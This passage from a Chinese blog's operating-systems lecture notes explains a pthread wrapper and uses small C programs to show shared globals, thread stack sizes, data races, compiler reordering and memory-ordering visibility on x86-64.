    state2: (g',T1',T2)
    state3: (g',T1,T2')
    state2 --> state4: 线程T1执行
    state2 --> state5: 线程T2执行
    state3 --> state6: 线程T1执行
    state3 --> state7: 线程T2执行
    state4: ……
    state5: ……
    state6: ……
    state7: ……</pre>

<h2 id="Simplified-Thread-API"><a href="#Simplified-Thread-API" class="headerlink" title="Simplified Thread API"></a>Simplified Thread API</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// thread.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTHREAD 6400</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> T_FREE = <span class="number">0</span>, T_LIVE, T_DEAD, &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> id, status;</span><br><span class="line">  <span class="keyword">pthread_t</span> thread;</span><br><span class="line">  <span class="keyword">void</span> (*entry)(<span class="keyword">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> <span class="title">tpool</span>[<span class="title">NTHREAD</span>], *<span class="title">tptr</span> =</span> tpool;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">wrapper</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">thread</span> =</span> (struct thread *)arg;</span><br><span class="line">  thread-&gt;entry(thread-&gt;id);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">void</span> *fn)</span> </span>&#123;</span><br><span class="line">  assert(tptr - tpool &lt; NTHREAD);</span><br><span class="line">  *tptr = (struct thread) &#123;</span><br><span class="line">    .id = tptr - tpool + <span class="number">1</span>,</span><br><span class="line">    .status = T_LIVE,</span><br><span class="line">    .entry = fn,</span><br><span class="line">  &#125;;</span><br><span class="line">  pthread_create(&amp;(tptr-&gt;thread), <span class="literal">NULL</span>, wrapper, tptr);</span><br><span class="line">  ++tptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NTHREAD; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span> =</span> &amp;tpool[i];</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;status == T_LIVE) &#123;</span><br><span class="line">      pthread_join(t-&gt;thread, <span class="literal">NULL</span>);</span><br><span class="line">      t-&gt;status = T_DEAD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((destructor)) <span class="function"><span class="keyword">void</span> <span class="title">cleanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>thread.h</code> 是对 C 库 pthreads 的进一步封装。其中的一些关键函数和代码解读如下：</p>
<ul>
<li><p><code>create(fn)</code> ：创建一个新的线程并立即执行，该线程的入口函数是 fn。</p>
<ul>
<li><p>函数 fn 的定义为 <code>void fn(int tid)</code>，其中 tid 为线程号，从 1 开始编号。</p>
</li>
<li><p>从状态机的角度来看，create() 的语义是在状态机中新开了一个链表，这个链表只有一个 fn 函数的栈帧。</p>
</li>
<li><p>原理：pthread_create() 函数的声明为</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_create</span><span class="params">(<span class="keyword">pthread_t</span> *thread, <span class="keyword">const</span> <span class="keyword">pthread_attr_t</span> *attr, <span class="keyword">void</span> *(*start_routine)(<span class="keyword">void</span> *), <span class="keyword">void</span> *arg)</span></span>;</span><br></pre></td></tr></table></figure>

<p>  其中 start_routine 是新线程第一个执行的函数，arg 是给 start_routine 传入的参数，attr 设置为 NULL 表示按照默认方式创建线程。<code>thread.h</code> 中传入的 start_routine 是 wrapper，wrapper 中的语句 <code>thread-&gt;entry(thread-&gt;id)</code> 以线程号为参数，调用了 fn 函数。</p>
</li>
</ul>
</li>
<li><p><code>join()</code>：<code>join()</code> 是线程中的“等待”，和进程中的 wait() 有一点相似。<code>join()</code> 的语义相当于在调用该函数的线程中加入了一条死循环语句：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (其他线程未结束);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>假设当前有三个线程 T1,T2,T3，T1 中调用了 <code>join()</code>，则之后的状态机如下：</p>
  <pre class="mermaid">        stateDiagram-v2
      state1:(T1(join),T2,T3)
      state1 --> state1: 线程 T1 执行
      state1 --> state2: 线程 T2 执行
      state1 --> state3: 线程 T3 执行
      state2:(T1(join), T2(end), T3)
      state3:(T1(join), T2, T3(end))
      state2 --> state2: 线程 T1 执行
      state2 --> state4: 线程 T3 执行
      state3 --> state3: 线程 T1 执行
      state3 --> state4: 线程 T2 执行
      state4: (T1,T2(end),T3(end))
      note right of state4
          T2,T3 线程均结束，T1 死循环解除
      end note
      state4 --> state5
      state5: ……</pre></li>
<li><p>原理：join() 中主线程会遍历线程数组，调用 pthread_join() 函数等待它们一一结束，将其状态设置为 T_DEAD，然后返回。pthread_join() 函数的声明为：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> thread, <span class="keyword">void</span> **retval)</span></span>;</span><br></pre></td></tr></table></figure>

<p>  当前函数会等待 thread 线程执行结束 (若 thread 已经结束就直接返回)，如果 retval 指针不为空，就将 thread 线程的退出状态指针填写到 retval 中。</p>
</li>
</ul>
</li>
<li><p>在 include 了 <code>threads.h</code> 的情况下，main() 函数执行结束后，所有新创建的线程会被自动释放。该功能是由 <code>thread.h</code> 中的 clean_up() 函数实现的 (添加了 <code>__attribute__((destructor))</code> 的函数会在 main() 函数返回之后被执行)。clean_up() 额外调用了一次 join()，</p>
</li>
</ul>
<h2 id="Concurrent-Programming-Introduction"><a href="#Concurrent-Programming-Introduction" class="headerlink" title="Concurrent Programming: Introduction"></a>Concurrent Programming: Introduction</h2><p>全局的变量会被各个线程共享，我们可以写一个程序来证明这一点：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// shm-test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Thello</span><span class="params">(<span class="keyword">int</span> tid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	usleep(tid * <span class="number">100000</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello world from thread #%c\n&quot;</span>, <span class="string">&quot;0123456789ABCDEF&quot;</span>[x++]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	x = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span> ; i++)</span><br><span class="line">		create(Thello);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该程序的输出结果为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello world from thread #1</span><br><span class="line">Hello world from thread #2</span><br><span class="line">Hello world from thread #3</span><br><span class="line">Hello world from thread #4</span><br><span class="line">Hello world from thread #5</span><br><span class="line">Hello world from thread #6</span><br><span class="line">Hello world from thread #7</span><br><span class="line">Hello world from thread #8</span><br><span class="line">Hello world from thread #9</span><br><span class="line">Hello world from thread #A</span><br></pre></td></tr></table></figure>

<p>可以看到，某一个线程对全局变量 x 的修改在别的线程是可见的。</p>
<hr>
<p>我们可以写一个小程序来探测每个线程的栈空间大小：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// stack-probe.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">__thread <span class="keyword">char</span> *base, *cur; <span class="comment">// thread-local variables</span></span><br><span class="line">__thread <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objdump to see how thread-local variables are implemented</span></span><br><span class="line">__attribute__((noinline)) <span class="function"><span class="keyword">void</span> <span class="title">set_cur</span><span class="params">(<span class="keyword">void</span> *ptr)</span> </span>&#123; cur = ptr; &#125;</span><br><span class="line">__attribute__((noinline)) <span class="function"><span class="keyword">char</span> *<span class="title">get_cur</span><span class="params">()</span>         </span>&#123; <span class="keyword">return</span> cur; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stackoverflow</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">  set_cur(&amp;n);</span><br><span class="line">  <span class="keyword">if</span> (n % <span class="number">1024</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> sz = base - get_cur();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack size of T%d &gt;= %d KB\n&quot;</span>, id, sz / <span class="number">1024</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  stackoverflow(n + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tprobe</span><span class="params">(<span class="keyword">int</span> tid)</span> </span>&#123;</span><br><span class="line">  id = tid;</span><br><span class="line">  base = (<span class="keyword">void</span> *)&amp;tid;</span><br><span class="line">  stackoverflow(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    create(Tprobe);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该代码中有一些值得注意的细节：</p>
<ul>
<li><p>程序的主要思想是使用一个死递归，由于函数的参数作为局部变量总是放在栈上，所以可以通过查看参数 n 的地址来获得大致的栈顶位置。触发段错误之后，根据输出信息大致判断栈的大小。</p>
</li>
<li><p>加入了 <code>__thread</code> 声明的变量是线程局部变量 (thread-local variables)，每个线程都单独拥有线程局部变量，对线程局部变量的修改操作彼此互不影响。</p>
</li>
<li><p><code>__attribute__((noinline))</code> 字段可以使函数不会被內联到函数内部，这有助于我们使用 <code>objdump</code> 工具反汇编可执行文件以观测线程局部变量的实现方式。<code>stack-probe.o</code> 的反汇编结果中 set_cur() 函数的汇编代码如下：</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000196 &lt;set_cur&gt;:</span><br><span class="line"> 196:   f3 0f 1e fa             endbr64 </span><br><span class="line"> 19a:   55                      push   %rbp		</span><br><span class="line"> 19b:   48 89 e5                mov    %rsp,%rbp			# 创建新的栈帧</span><br><span class="line"> 19e:   48 89 7d f8             mov    %rdi,-0x8(%rbp)		</span><br><span class="line"> 1a2:   48 8b 45 f8             mov    -0x8(%rbp),%rax		# 将第一个参数的值放入rax</span><br><span class="line"> 1a6:   64 48 89 04 25 00 00    mov    %rax,%fs:0x0			# 将rax的值赋给cur</span><br><span class="line"> 1ad:   00 00 </span><br><span class="line"> 1af:   90                      nop</span><br><span class="line"> 1b0:   5d                      pop    %rbp</span><br><span class="line"> 1b1:   c3                      ret</span><br></pre></td></tr></table></figure>

<p>  可以看到 <code>%fs:0x0</code> 代表的就是线程局部变量 cur 的地址。%fs 是 x86-64 的一个段寄存器，使用 %fs 将引用线程的 glibc TLS (thread local storage)。这里的偏移量之所以是 0 是因为还没有重定位，重定位之后每个变量都会有一个不同的 offset。</p>
</li>
</ul>
<p>根据程序的输出结果，可以看出每个线程栈大小为 8192K=8M。</p>
<blockquote>
<p><strong>Tip: Unix Philosophy</strong></p>
<p>由于有多个线程并发输出，该程序的输出结果非常杂乱，为处理之前大致如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">Stack size of T1 &gt;= 8128 KB</span><br><span class="line">Stack size of T3 &gt;= 8064 KB</span><br><span class="line">Stack size of T4 &gt;= 6208 KB</span><br><span class="line">Stack size of T2 &gt;= 7616 KB</span><br><span class="line">Stack size of T3 &gt;= 8128 KB</span><br><span class="line">[1]    46916 segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>

<p>我们可以利用命令行的 sort 工具来整理输出结果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./stack-probe | sort -nk 6</span><br></pre></td></tr></table></figure>

<p>其中参数 <code>-n</code> 表示比较时将字符串转换成数值进行比较 (如果不加这个参数，那些九百多的三位数会被排在作后)，<code>-k</code> 表示选择第几列进行比较，后面的数字 6 指定了数值的那一列。</p>
</blockquote>
<blockquote>
<p><strong>如何修改线程栈的大小？</strong></p>
<p>在执行程序前，使用命令 <code>ulimit -s SIZE</code> 来修改栈大小。SIZE 的单位是 KB。修改完之后，使用 <code>stack-probe.c</code> 程序进行检测可以看到线程栈大小改变了。</p>
<p>(注：关闭终端后该改变会失效。)</p>
</blockquote>
<h2 id="Concurrent-Programming-Atomicity"><a href="#Concurrent-Programming-Atomicity" class="headerlink" title="Concurrent Programming: Atomicity"></a>Concurrent Programming: Atomicity</h2><p>考虑以下程序：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// sum.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tsum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    sum++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>两个线程各对全局变量 sum 进行 N 次 +1 操作，理论上应该得到结果 200000000，但运行该程序每次都会得到远小于 200000000 的各不相同的结果。导致这个结果的原因是<strong>原子性的丧失</strong>：“程序 (甚至是一条指令) 独占处理器运行“的基本假设在现代多处理器系统上不再成立。</p>
<blockquote>
<p><strong>Tip: Unix Philosophy</strong></p>
<p>我们想多观测几次 <code>sum.c</code> 程序的输出，但重复执行 <code>./sum</code> 太低效了。好的方法是现场写一个 shell 脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> ./sum; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>注：在一行内写 shell 脚本需要注意不同语句之间要用分号隔开。</p>
</blockquote>
<p>考察 Tsum() 函数的汇编结果，其中 sum++ 这条核心语句被编译成了 3 条汇编指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1a7:   48 8b 05 00 00 00 00    mov    0x0(%rip),%rax        # 1ae &lt;Tsum+0x18&gt;</span><br><span class="line">1ae:   48 83 c0 01             add    $0x1,%rax</span><br><span class="line">1b2:   48 89 05 00 00 00 00    mov    %rax,0x0(%rip)        # 1b9 &lt;Tsum+0x23&gt;</span><br></pre></td></tr></table></figure>

<p><code>0x0(%rip)</code> 是变量 sum 的地址，由于还没有重定位，所以偏移量还没有填入。sum 的值会先被放入 %rax，然后 %rax +1，然后 %rax 的值被写回 sum。假设当前两个线程在并发地执行这段代码，轮流执行，则执行情况如下表 (设 sum 的初值为 s) ：</p>
<table>
<thead>
<tr>
<th></th>
<th>Thread1</th>
<th>Thread2</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>%rax in CPU1 = s</td>
<td>%rax in CPU2 = s</td>
</tr>
<tr>
<td>2</td>
<td>%rax in CPU1 = s+1</td>
<td>%rax in CPU2 = s+1</td>
</tr>
<tr>
<td>3</td>
<td>sum = s+1</td>
<td>sum = s+1</td>
</tr>
</tbody></table>
<p>可以看到 +1 操作被吞掉了一次。两个线程在并发地对同一个内存地址进行读写，打破了 invariant，从而导致并发 bug。</p>
<p>解决这个问题的方法是用锁将这几句代码包裹起来，强制两个线程串行地执行。</p>
<h2 id="Concurrent-Programming-Order"><a href="#Concurrent-Programming-Order" class="headerlink" title="Concurrent Programming: Order"></a>Concurrent Programming: Order</h2><p>如果对 <code>sum.c</code> 进行 -O1 和 -O2 优化，我们会得到不同的结果：</p>
<ul>
<li><p>在 -O1 优化下，编译器会分析出函数的目的是 sum+=N，并使用 Reg = sum, Reg += N, sum = Reg 三条指令实现。因为 race condition，两次 sum = Reg 重复写入，所以 -O1 优化下输出结果为 100000000。</p>
</li>
<li><p>-O2 优化更为彻底，直接使用一条指令</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 81 05 01 2e 00 00    addq   $0x5f5e100, 0x0(%rip)</span><br></pre></td></tr></table></figure>

<p>  来完成。至少“看上去”获得了正确的结果 200000000。(Visibility 一节会再分析这种情况)</p>
</li>
</ul>
<p>另外一个例子是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> done;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!done);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>的汇编代码是 (-O2 优化)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:   f3 0f 1e fa             endbr64 </span><br><span class="line">   4:   8b 05 00 00 00 00       mov    0x0(%rip),%eax        # a &lt;main+0xa&gt;</span><br><span class="line">   a:   85 c0                   test   %eax,%eax</span><br><span class="line">   c:   75 02                   jne    10 &lt;main+0x10&gt;</span><br><span class="line">   e:   eb fe                   jmp    e &lt;main+0xe&gt;</span><br><span class="line">  10:   31 c0                   xor    %eax,%eax</span><br><span class="line">  12:   c3                      ret</span><br></pre></td></tr></table></figure>

<p>它实际上被翻译成了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!done) <span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>编译器无法考虑到多线程的可能，它认为在执行 <code>while (!done)</code> 的过程中当前程序是不可能被打断的。从状态及的角度来考虑，编译器只要保证最终结果的一致性 (语义一致性)，是可以随意修改指令的顺序 (甚至是指令本身) 的，这给并发编程带来了困难。</p>
<hr>
<p>使上述代码能够被正确地编译，一种方法是在循环中加上 memory barrier：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (!done) <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;&quot;</span> ::: <span class="string">&quot;memory&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>memory barrier 相当于告诉编译器：这里可能发生任意的对内存的修改，所以编译器不再有对 done 的值保持不变的假设。</p>
<p>另一种方法是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="keyword">volatile</span> done;</span><br></pre></td></tr></table></figure>

<p>它也可以保证 C 语义和汇编语义的一致性。</p>
<h2 id="Concurrent-Programming-Visibility"><a href="#Concurrent-Programming-Visibility" class="headerlink" title="Concurrent Programming: Visibility"></a>Concurrent Programming: Visibility</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// mem-ordering.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">atomic_int</span> flag;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG atomic_load(&amp;flag)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FLAG_XOR(val) atomic_fetch_xor(&amp;flag, val)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WAIT_FOR(cond) while (!(cond)) ;</span></span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_x_read_y</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y_val;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;=m&quot;</span>(x), <span class="string">&quot;=r&quot;</span>(y_val) : <span class="string">&quot;m&quot;</span>(y)</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, y_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> __attribute__((noinline))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_y_read_x</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x_val;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1</span></span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span></span></span><br><span class="line"><span class="params"><span class="function">  )</span></span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, x_val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">T1</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">1</span>));</span><br><span class="line">    write_x_read_y();</span><br><span class="line">    FLAG_XOR(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">T2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    WAIT_FOR((FLAG &amp; <span class="number">2</span>));</span><br><span class="line">    write_y_read_x();</span><br><span class="line">    FLAG_XOR(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tsync</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    x = y = <span class="number">0</span>;</span><br><span class="line">    __sync_synchronize(); <span class="comment">// full barrier</span></span><br><span class="line">    usleep(<span class="number">1</span>);            <span class="comment">// + delay</span></span><br><span class="line">    assert(FLAG == <span class="number">0</span>);</span><br><span class="line">    FLAG_XOR(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">// T1 and T2 clear 0/1-bit, respectively</span></span><br><span class="line">    WAIT_FOR(FLAG == <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  create(T1);</span><br><span class="line">  create(T2);</span><br><span class="line">  create(Tsync);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对该程序的一些关键代码解读如下：</p>
<ul>
<li>Tsync 是一个控制线程。它负责将一个开关变量 flag 的第一位和第二位拉高。flag 的第一位供 T1 线程使用，第二位供 T2 线程使用。等待 T1 和 T2 线程均完成操作后，Tsync 会进行下一次循环，Tsync 的设置保证了 T1 和 T2 总是能”同时“开始运行。</li>
<li>T1 和 T2 线程会写入 x/y 并读取 y/x，完成操作后将 flag 的对应位拉低。我们在內联汇编代码中已经加入了 memory fence 保证编译器会按照顺序编译我们的代码。</li>
</ul>
<p>按理来说，根据执行顺序的不同，我们可能会获得 x=0 y=1，x=1 y=0，x=1 y=1 三种结果，但不可能获得 x=0 y=0。但事实上输出结果中确实有 (0,0)。我们还可以运行很多次，然后统计每种输出出现的频数。这里再次利用了 Unix Philosophy:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./mem-ordering | head -n 100000 | sort | uniq -c</span><br></pre></td></tr></table></figure>

<p><code>head</code> 命令用于取开头的若干行，用 <code>sort</code> 排序后，<code>uniq -c</code> 可以去重并统计每种输出出现的次数。可以看到 (0,0) 是最多的，(0,1) 比 (1,0) 稍多一些 (这是由于两个线程的不对称性)，(1,1) 没有。</p>
<p>现代处理器会将指令分解成更小的“微指令” $\mu op$，这意味着处理器也是一个“编译器”。处理器会维护一个微指令池，其中记录了微指令之间的依赖关系以及出现顺序关系，并在不影响 eventual memory consistency 的情况下调整微指令的执行顺序，多个处理器之间的即时可见性丧失。</p>
<p>在本例中，由于对 x 变量地址读取的 cache miss，处理器可能会先取出下一条指令的 $\mu op$ 来做：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     # &lt;-----------+</span><br><span class="line">movl $1, (x)   #   |</span><br><span class="line">movl (y), %eax # --+</span><br></pre></td></tr></table></figure>

<p>因此，输出结果中出现了 $x=y=0$ 的情况。</p>
<hr>
<p>解决这个问题只能从硬件的角度入手。比如可以使用 full barrier <code>__sync_synchronize()</code> ，(在內联汇编中，可以直接使用 <code>mfence</code> 指令)，或者使用原子指令。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lecture 06: Concurrent Programming: Synchronization</title>
    <url>/2022/03/06/NJU-OS%20Lecture%2006%20-%20Concurrent%20Programming%20-%20Synchronization/</url>
    <content><![CDATA[<p>线程同步：在某个时间点共同达到互相已知的状态。(每个线程都有可能做自己的某个耗时很长的工作)</p>
<ul>
<li>nnpy：等我洗完头就吃饭/等我打完游戏就吃饭。</li>
<li>“先到先等”的同步机制。</li>
</ul>
<span id="more"></span>

